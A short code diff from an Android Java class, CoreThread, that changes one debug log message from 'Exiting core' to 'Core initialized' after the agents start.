@@ -249,7 +249,7 @@ public class CoreThread extends Activity implements Runnable {
 			// #ifdef DEBUG
 			debug.info("Agents started");
 
-			Log.d("RCS", "Exiting core");
+			Log.d("RCS", "Core initialized");
 			return true;
 
 		} catch (final RCSException rcse) {
